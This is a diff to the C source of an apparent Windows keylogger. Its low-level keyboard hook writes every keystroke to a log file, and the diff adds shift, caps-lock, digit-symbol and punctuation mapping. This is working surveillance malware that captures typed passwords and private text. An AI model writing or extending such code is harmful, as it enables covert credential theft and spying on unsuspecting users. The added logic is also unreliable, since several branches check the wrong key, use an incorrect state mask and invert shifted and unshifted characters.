@@ -1,5 +1,6 @@
 #include <Windows.h>
 #include <stdio.h>
+#include <ctype.h>
 
 #include "klogger.h"
 
@@ -47,9 +48,53 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 			// 0x60 to 0x69 define numpad keys
 			else if (vkey >= 0x30 && vkey <= 0x5a || vkey >= 0x60 && vkey <= 0x69)
 			{
-				// buffer[i++] = MapVirtualKey(vkey, MAPVK_VK_TO_CHAR);
-				char value[] = { MapVirtualKey(vkey, MAPVK_VK_TO_CHAR) };
-				fputc(value[0], kbpFile);
+				if ((GetKeyState(VK_LSHIFT) & 0x00010000) || (GetKeyState(VK_RSHIFT) & 0x00010000))
+				{
+					if (isalpha(vkey) && ((GetKeyState(VK_CAPITAL) & 0x00000001) != 1))
+						fputc(MapVirtualKey(vkey, MAPVK_VK_TO_CHAR), kbpFile);
+					else if (isdigit(vkey))
+					{
+						switch (vkey)
+						{
+						case 0x30:
+							fputc(')', kbpFile);
+							break;
+						case 0x31:
+							fputc('!', kbpFile);
+							break;
+						case 0x32:
+							fputc('@', kbpFile);
+							break;
+						case 0x033:
+							fputc('#', kbpFile);
+							break;
+						case 0x34:
+							fputc('$', kbpFile);
+							break;
+						case 0x35:
+							fputc('%', kbpFile);
+							break;
+						case 0x36:
+							fputc('^', kbpFile);
+							break;
+						case 0x37:
+							fputc('&', kbpFile);
+							break;
+						case 0x38:
+							fputc('*', kbpFile);
+							break;
+						case 0x39:
+							fputc('(', kbpFile);
+							break;
+						default:
+							break;
+						}
+					}
+				}
+				else if ((isalpha(vkey) && (GetKeyState(VK_CAPITAL) & 0x00000001)) || (!(isalpha(vkey))))
+					fputc(MapVirtualKey(vkey, MAPVK_VK_TO_CHAR), kbpFile);
+				else
+					fputc(tolower(MapVirtualKey(vkey, MAPVK_VK_TO_CHAR)), kbpFile);
 			}
 			else
 			{
@@ -241,6 +286,62 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 					break;
 				case VK_F12:
 					fputs("[f12]", kbpFile);
+					break;
+				case VK_OEM_1:
+					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
+						fputc(';', kbpFile);
+					else fputc(':', kbpFile);
+					break;
+				case VK_OEM_PLUS:
+					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
+						fputc('+', kbpFile);
+					else fputc('=', kbpFile);
+					break;
+				case VK_OEM_COMMA:
+					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
+						fputc('<', kbpFile);
+					else fputc(',', kbpFile);
+					break;
+				case VK_OEM_MINUS:
+					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
+						fputc('_', kbpFile);
+					else fputc('-', kbpFile);
+					break;
+				case VK_OEM_PERIOD:
+					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
+						fputc('>', kbpFile);
+					else fputc('.', kbpFile);
+					break;
+				// for US standard keyboard
+				case VK_OEM_2:
+					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
+						fputc('?', kbpFile);
+					else fputc('/', kbpFile);
+					break;
+				case VK_OEM_3:
+					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
+						fputc('~', kbpFile);
+					else fputc('`', kbpFile);
+					break;
+				case VK_OEM_4:
+					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
+						fputc('{', kbpFile);
+					else fputc('[', kbpFile);
+					break;
+				case VK_OEM_5:
+					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
+						fputc('|', kbpFile);
+					else fputc('\\', kbpFile);
+					break;
+				case VK_OEM_6:
+					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
+						fputc('}', kbpFile);
+					else fputc(']', kbpFile);
+					break;
+				case VK_OEM_7:
+					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
+						fputc('"', kbpFile);
+					else fputc('\'', kbpFile);
 					break;
 				default:
 					break;
